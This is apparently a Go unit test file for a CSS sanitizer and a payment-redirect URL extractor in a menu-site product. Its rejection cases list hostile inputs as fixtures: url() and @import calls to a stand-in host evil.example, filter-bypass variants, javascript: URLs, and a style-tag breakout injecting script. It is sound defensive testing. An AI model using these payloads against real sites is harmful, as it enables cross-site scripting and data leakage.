package domain

import (
	"errors"
	"strings"
	"testing"
)

func TestSanitizeCustomCSS_AllowsSafeScopedRules(t *testing.T) {
	css := ".rtylr-menu-root { --menu-accent: #c8a96e; letter-spacing: 0.02em; }"
	got, err := SanitizeCustomCSS(css)
	if err != nil {
		t.Fatalf("expected valid CSS, got error: %v", err)
	}
	if got != css {
		t.Fatalf("unexpected sanitized CSS: %q", got)
	}

	unscoped, err := SanitizeCustomCSS("body { color: #111; } .card, h2 { margin: 0; }")
	if err != nil {
		t.Fatalf("expected unscoped safe CSS to be scoped, got error: %v", err)
	}
	if !strings.Contains(unscoped, ".rtylr-menu-root { color: #111; }") ||
		!strings.Contains(unscoped, ".rtylr-menu-root .card, .rtylr-menu-root h2 { margin: 0; }") {
		t.Fatalf("expected rules scoped under .rtylr-menu-root, got: %q", unscoped)
	}
}

func TestSanitizeCustomCSS_RejectsDangerousDirectives(t *testing.T) {
	cases := []string{
		"@import url('https://evil.example/a.css');",
		"body { background: url(https://evil.example/leak?x=1); }",
		"body { background: u/*bypass*/rl(https://evil.example/leak); }",
		`body { background: \75rl(https://evil.example/leak); }`,
		"a { background: url(javascript:alert(1)); }",
		"div { width: expression(alert(1)); }",
		"</style><script>alert(1)</script>",
		"footer { display: none !important; }",
		".rtylr-menu-root .layout__poweredBy { opacity: 0; }",
		strings.Repeat("a", MaxCustomCSSBytes+1),
	}
	for _, tc := range cases {
		if _, err := SanitizeCustomCSS(tc); !errors.Is(err, ErrUnsafeCustomCSS) {
			t.Fatalf("expected ErrUnsafeCustomCSS for %q, got %v", tc, err)
		}
	}
}

func TestExtractPaymentRedirectURL(t *testing.T) {
	cfg := `{"payment":{"mode":"redirect","redirectUrl":"https://pay.example.com/checkout"}}`
	if got := ExtractPaymentRedirectURL(cfg); got != "https://pay.example.com/checkout" {
		t.Fatalf("expected redirect URL, got %q", got)
	}

	posCfg := `{"payment":{"mode":"pos","redirectUrl":"https://pay.example.com/checkout"}}`
	if got := ExtractPaymentRedirectURL(posCfg); got != "" {
		t.Fatalf("expected empty URL in pos mode, got %q", got)
	}

	badScheme := `{"payment":{"mode":"redirect","redirectUrl":"javascript:alert(1)"}}`
	if got := ExtractPaymentRedirectURL(badScheme); got != "" {
		t.Fatalf("expected empty URL for javascript scheme, got %q", got)
	}
}
